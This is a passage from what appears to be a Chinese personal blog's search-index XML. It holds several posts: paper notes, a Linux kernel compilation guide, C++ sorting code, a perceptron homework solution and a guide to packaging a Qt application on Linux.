<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFD2014&amp;filename=JSJX201405021&amp;v=u%25mmd2FXyKNgKblZDXNd1PBDDrj4%25mmd2BkCMAh5GmPm2gysD0h%25mmd2FlNMKEyMtTn3Y1mpOCwBZ1e">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFD2014&amp;filename=JSJX201405021&amp;v=u%25mmd2FXyKNgKblZDXNd1PBDDrj4%25mmd2BkCMAh5GmPm2gysD0h%25mmd2FlNMKEyMtTn3Y1mpOCwBZ1e</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>入侵检测</tag>
      </tags>
  </entry>
  <entry>
    <title>基于多目标进化算法的变密度模糊认知图学习</title>
    <url>/2020/09/09/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%9B%AE%E6%A0%87%E8%BF%9B%E5%8C%96%E7%AE%97%E6%B3%95%E7%9A%84%E5%8F%98%E5%AF%86%E5%BA%A6%E6%A8%A1%E7%B3%8A%E8%AE%A4%E7%9F%A5%E5%9B%BE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Densities, fuzzy cognitive maps, multiobjective evolutionary algorithms (MOEAs), multiobjective optimization problems (MOP)</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/09/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%9B%AE%E6%A0%87%E8%BF%9B%E5%8C%96%E7%AE%97%E6%B3%95%E7%9A%84%E5%8F%98%E5%AF%86%E5%BA%A6%E6%A8%A1%E7%B3%8A%E8%AE%A4%E7%9F%A5%E5%9B%BE%E5%AD%A6%E4%B9%A0/image-20210524203330315.png" alt="image-20210524203330315"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/7094248">https://ieeexplore.ieee.org/document/7094248</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>FCM</tag>
        <tag>多目标优化MOP</tag>
      </tags>
  </entry>
  <entry>
    <title>如何编译内核源码</title>
    <url>/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<ol>
<li><a href="https://www.kernel.org/">https://www.kernel.org/</a> 下载内核源码 linux-5.4.128</li>
</ol>
<p><img src="/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/image-20210630105003356.png" alt="image-20210630105003356"></p>
<ol>
<li><code>sudo su</code> 切换成 root，将内核源码解压到 <code>/usr/src</code> 目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xz -d linux-5.4.128.tar.xz</span><br><span class="line">tar xvf linux-5.4.128.tar -C /usr/src</span><br></pre></td></tr></table></figure>
<ol>
<li>进入源码目录 <code>/usr/src/linux-5.4.128</code></li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<ul>
<li>报错 1</li>
</ul>
<p><img src="/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/image-20210630105059693.png" alt="image-20210630105059693"></p>
<p>解决方法 <a href="https://blog.csdn.net/zhangbaoxiang/article/details/114288159">https://blog.csdn.net/zhangbaoxiang/article/details/114288159</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install flex</span><br><span class="line">apt install bison</span><br></pre></td></tr></table></figure>
<p>重新来一次就可以成功配置</p>
<ul>
<li>报错 2</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure>
<p>解决方法 <a href="https://blog.csdn.net/bhniunan/article/details/104039373">https://blog.csdn.net/bhniunan/article/details/104039373</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install libncurses5-dev</span><br></pre></td></tr></table></figure>
<ol>
<li>编译</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
<p>报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scripts/sign-file.c:25:10: fatal error: openssl/opensslv.h: No such file or directory</span><br></pre></td></tr></table></figure>
<p>解决方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install libssl-dev</span><br></pre></td></tr></table></figure>
<p>重新执行 make，产生报错 2</p>
<p>解决方法 <a href="https://blog.csdn.net/u010629326/article/details/73196311">参考评论</a>：<code>vi .config</code>，将 CONFIG_SYSTEM_TRUSTED_KEYS 设为空串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONFIG_SYSTEM_TRUSTED_KEYS=&quot;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/image-20210630111334911.png" alt="image-20210630111334911"></p>
<p><img src="/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/image-20210630111531298.png" alt="image-20210630111531298"></p>
<p>重新执行 make，有警告</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">warning: Cannot use CONFIG_STACK_VALIDATION=y, please install libelf-dev, libelf-devel or elfutils-libelf-devel</span><br></pre></td></tr></table></figure>
<p>但无报错</p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>Linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title>常见算法</title>
    <url>/2021/06/28/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/BV1cK4y1R7rY?p=2">https://www.bilibili.com/video/BV1cK4y1R7rY?p=2</a></p>
<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><ul>
<li>时间复杂度 $O(n*long_2(n))$</li>
<li>空间复杂度 $O(n)$</li>
<li>稳定</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使数组 arr 在 L,R 范围内有序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == R) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = L + ((R - L) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 使 L,mid 区间有序</span></span><br><span class="line">    <span class="built_in">process</span>(arr, L, mid);</span><br><span class="line">    <span class="comment">// 使 mid,R 有序</span></span><br><span class="line">    <span class="built_in">process</span>(arr, mid + <span class="number">1</span>, R);</span><br><span class="line">    <span class="comment">// 经过上面两次过程，整体还是无序的，因此需要进行 merge</span></span><br><span class="line">    <span class="built_in">mergeSort</span>(arr, L, mid, R);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> L, <span class="keyword">int</span> M, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">help</span><span class="params">(R - L + <span class="number">1</span>)</span></span>;  <span class="comment">// L,R 范围的辅助空间</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> p1 = L;</span><br><span class="line">    <span class="keyword">int</span> p2 = M + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (p1 &lt;= M &amp;&amp; p2 &lt;= R) &#123;</span><br><span class="line">        <span class="comment">// p1 p2 都没越界，谁小就拷贝到 help</span></span><br><span class="line">        help[i++] = arr[p1] &lt;= arr[p2] ? arr[p1++] : arr[p2++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p1 &lt;= M) &#123;</span><br><span class="line">        help[i++] = arr[p1++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p2 &lt;= R) &#123;</span><br><span class="line">        help[i++] = arr[p2++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; help.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        arr[L + i] = help[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><ul>
<li>时间复杂度 $O(n*long_2(n))$</li>
<li>空间复杂度 $O(long_2(n))$</li>
<li>不稳定</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    <span class="function">uniform_real_distribution&lt;<span class="keyword">float</span>&gt; <span class="title">u</span><span class="params">(<span class="number">0</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    default_random_engine e;</span><br><span class="line">    <span class="keyword">if</span> (L &lt; R) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(arr[L + (<span class="keyword">int</span>)(<span class="built_in">u</span>(e) * (R - L + <span class="number">1</span>))], arr[R]);  <span class="comment">// 随机选一个位置与最后一个数做交换</span></span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; p = <span class="built_in">partition</span>(arr, L, R);  <span class="comment">// 长度为 2 的数组，p[0] p[1] 分别表示等于区域的左右边界</span></span><br><span class="line">        <span class="built_in">quickSort</span>(arr, L, p[<span class="number">0</span>] - <span class="number">1</span>);  <span class="comment">// 小于区域</span></span><br><span class="line">        <span class="built_in">quickSort</span>(arr, p[<span class="number">1</span>] + <span class="number">1</span>, R);  <span class="comment">// 大于区域</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">partition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> less = L - <span class="number">1</span>;  <span class="comment">// 小于区域右边界</span></span><br><span class="line">    <span class="keyword">int</span> more = R;  <span class="comment">// 大于区域左边界</span></span><br><span class="line">    <span class="keyword">while</span> (L &lt; more) &#123;  <span class="comment">// L 表示当前数的位置，R 表示划分值的位置</span></span><br><span class="line">        <span class="keyword">if</span> (arr[L] &lt; arr[R]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(arr[++less], arr[L++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (arr[L] &gt; arr[R]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(arr[--more], arr[L]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            L++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">swap</span>(arr[more], arr[R]);</span><br><span class="line">    <span class="keyword">return</span> &#123; less + <span class="number">1</span>, more &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>感知器算法作业</title>
    <url>/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>编写感知器算法，求下列模式的解向量：</p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image002.png" alt="img"></p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image004.png" alt="img"></p>
<p>设<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image006.png" alt="img"></p>
<h2 id="算法介绍"><a href="#算法介绍" class="headerlink" title="算法介绍"></a>算法介绍</h2><p>（1）将训练样本写成增广向量的形式，然后规范化（将属于<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image008.png" alt="img">的训练集样本乘以<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image010.png" alt="img">），任取初始权向量<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image012.png" alt="img">开始迭代（这里已经给定为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image006.png" alt="img">），括号里的1代表迭代次数k=1</p>
<p>（2）用所有的训练样本进行迭代，每输入一个样本X都计算一次<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image014.png" alt="img"></p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image016.png" alt="img"></p>
<p>这里的c为校正增量系数，大于0即可。</p>
<p>（3）只要某一轮中有一个样本的<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image018.png" alt="img">则回到（2），直到所有样本训练都正确分类。</p>
<h2 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h2><p>在编写代码时，将计算过程中每一步状态的值都cout出来，当设定初始权向量<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image006.png" alt="img">，校正增量系数c为1时，有具体过程如下：</p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image020.jpg" alt="img"></p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image022.jpg" alt="img"></p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image024.jpg" alt="img"></p>
<p>由此可得：解向量为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image026.png" alt="img"></p>
<p>判别函数为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image028.png" alt="img"></p>
<h2 id="结果分析讨论"><a href="#结果分析讨论" class="headerlink" title="结果分析讨论"></a>结果分析讨论</h2><p>（1）当我设定初始权向量<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image030.png" alt="img">，校正增量系数c为1时，有最终的解向量输出结果如下：</p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image032.jpg" alt="img"></p>
<p>经5轮迭代，此时的解向量为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image034.png" alt="img">，判别函数为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image036.png" alt="img"></p>
<p>（2）当设定初始权向量<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image006.png" alt="img">，校正增量系数c为4时，有输出结果如下：</p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image038.jpg" alt="img"></p>
<p>迭代4轮后，输出解向量为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image040.png" alt="img"></p>
<p>由此可得，当初始权向量和校正增量系数取不同值时，输出的结果并不相同，所以感知器算法的解，不是单值的。</p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x[<span class="number">9</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">		&#123;<span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">// 权向量初始值w[1]   校正增量系数c   判别函数d  轮数roundCount   迭代标号k   错判次数mistake</span></span><br><span class="line">	<span class="keyword">int</span> k = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> w[<span class="number">100</span>][<span class="number">4</span>] = &#123; &#123;<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>, <span class="number">-2</span>, <span class="number">-2</span>, <span class="number">0</span>&#125; &#125;;</span><br><span class="line">	<span class="comment">/*int w[100][4] = &#123; 0 &#125;;*/</span></span><br><span class="line">	<span class="keyword">int</span> d = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">double</span> c = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">int</span> roundCount = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> mistake = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		mistake = <span class="number">0</span>;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;第&quot;</span> &lt;&lt; roundCount &lt;&lt; <span class="string">&quot;轮&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">8</span>; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			d = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">			&#123;</span><br><span class="line">				d += w[k][j] * x[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;WT(&quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="string">&quot;X&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;=&quot;</span> &lt;&lt; d &lt;&lt; std::endl;</span><br><span class="line">			<span class="keyword">if</span> (d &lt;= <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				std::cout &lt;&lt; <span class="string">&quot;W(&quot;</span> &lt;&lt; k + <span class="number">1</span> &lt;&lt; <span class="string">&quot;)=&quot;</span> &lt;&lt; <span class="string">&quot;W(&quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; c</span><br><span class="line">					&lt;&lt; <span class="string">&quot;*X&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;=( &quot;</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">				&#123;</span><br><span class="line">					w[k + <span class="number">1</span>][j] = w[k][j] + c * x[i][j];</span><br><span class="line">					std::cout &lt;&lt; w[k + <span class="number">1</span>][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				std::cout &lt;&lt; <span class="string">&quot;)T&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">				++mistake;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				std::cout &lt;&lt; <span class="string">&quot;W(&quot;</span> &lt;&lt; k + <span class="number">1</span> &lt;&lt; <span class="string">&quot;)=&quot;</span> &lt;&lt; <span class="string">&quot;W(&quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot;)=( &quot;</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">				&#123;</span><br><span class="line">					w[k + <span class="number">1</span>][j] = w[k][j];</span><br><span class="line">					std::cout &lt;&lt; w[k + <span class="number">1</span>][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				std::cout &lt;&lt; <span class="string">&quot;)T&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">			&#125;</span><br><span class="line">			++k;</span><br><span class="line">		&#125;</span><br><span class="line">		++roundCount;</span><br><span class="line">	&#125; <span class="keyword">while</span> (mistake &gt; <span class="number">0</span>);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;解向量W=( &quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; w[k][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;)T&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cin.<span class="built_in">get</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
      <tags>
        <tag>感知器算法</tag>
        <tag>模式识别</tag>
      </tags>
  </entry>
  <entry>
    <title>打包Qt项目</title>
    <url>/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h2 id="1-Linux环境"><a href="#1-Linux环境" class="headerlink" title="1 Linux环境"></a>1 Linux环境</h2><h3 id="1-1-构建-Release-版本"><a href="#1-1-构建-Release-版本" class="headerlink" title="1.1 构建 Release 版本"></a>1.1 构建 Release 版本</h3><ul>
<li>Projects - Add Release - 添加版本名称并确定 - Build</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608094704865.png" alt="image-20210608094704865"></p>
<h3 id="1-2-脚本文件"><a href="#1-2-脚本文件" class="headerlink" title="1.2 脚本文件"></a>1.2 脚本文件</h3><ul>
<li>进入上文构建的 Release 目录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi copylib.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>copylib.sh 内容如下（此处无需修改）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LibDir=$PWD&quot;/lib&quot;</span><br><span class="line">Target=$1</span><br><span class="line"></span><br><span class="line">lib_array=($(ldd $Target | grep -o &quot;/.*&quot; | grep -o &quot;/.*/[^[:space:]]*&quot;))</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">(mkdir <span class="variable">$LibDir</span>)</span></span><br><span class="line"></span><br><span class="line">for Variable in $&#123;lib_array[@]&#125;</span><br><span class="line">do</span><br><span class="line">    cp &quot;$Variable&quot; $LibDir</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h3 id="1-3-生成项目的库文件"><a href="#1-3-生成项目的库文件" class="headerlink" title="1. 3 生成项目的库文件"></a>1. 3 生成项目的库文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 777 copylib.sh</span><br><span class="line">./copylib.sh projectName</span><br></pre></td></tr></table></figure>
<ul>
<li>projectName 为项目名，我的是 Client，根据自己项目自行修改。随即在同目录生成了 lib 文件夹</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608100547153.png" alt="image-20210608100547153"></p>
<ul>
<li>桌面新建空文件夹，这里命名为 new</li>
<li>将上文中构建的 Release 版本的二进制文件及库文件全部复制到新建的这个 new 中来，（不保留 lib 目录，将其中文件均复制过来）</li>
</ul>
<h3 id="1-4-Qt-安装目录的插件中提取-platforms"><a href="#1-4-Qt-安装目录的插件中提取-platforms" class="headerlink" title="1. 4 Qt 安装目录的插件中提取 platforms"></a>1. 4 Qt 安装目录的插件中提取 platforms</h3><ul>
<li>进入 <code>/opt/Qt5.14.2/5.14.2/gcc_64/plugins/platforms</code></li>
<li>将 copylib.sh 复制到的platforms</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./copylib.sh libqxcb.so</span><br></pre></td></tr></table></figure>
<ul>
<li>这会生成一个新的 lib 文件夹，将此文件夹所有文件均复制到 new 目录中，删除这个 lib 文件夹</li>
<li>遇到同名文件则跳过，将整个 platforms 复制到 new 目录中</li>
<li>在 new 目录新建与项目同名的脚本，这里是 Client.sh</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi projectName.sh</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">appname=`basename $0 | sed s,\.sh$,,`</span><br><span class="line"></span><br><span class="line">dirname=`dirname $0`</span><br><span class="line">tmp=&quot;$&#123;dirname#?&#125;&quot;</span><br><span class="line"></span><br><span class="line">if [ &quot;$&#123;dirname%$tmp&#125;&quot; != &quot;/&quot; ]; then</span><br><span class="line">dirname=$PWD/$dirname</span><br><span class="line">fi</span><br><span class="line">LD_LIBRARY_PATH=$dirname</span><br><span class="line">export LD_LIBRARY_PATH</span><br><span class="line"><span class="meta">$</span><span class="bash">dirname/<span class="variable">$appname</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 777 projectName.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>到这里按说是完成了，但是执行这个 projectName.sh 时，会报错，遇到了xcb的问题，这个问题可以通过 ldd 和 Qt 的调试设置来查明</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608102722541.png" alt="image-20210608102722541"></p>
<h3 id="1-5-解决-xcb-问题"><a href="#1-5-解决-xcb-问题" class="headerlink" title="1. 5 解决 xcb 问题"></a>1. 5 解决 xcb 问题</h3><ul>
<li>设置环境变量，以便于看到 Qt 加载的过程，看到详细的报错信息。然后执行上文中的 projectName.sh</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export QT_DEBUG_PLUGINS=1</span><br><span class="line">./projectName.sh</span><br></pre></td></tr></table></figure>
<ul>
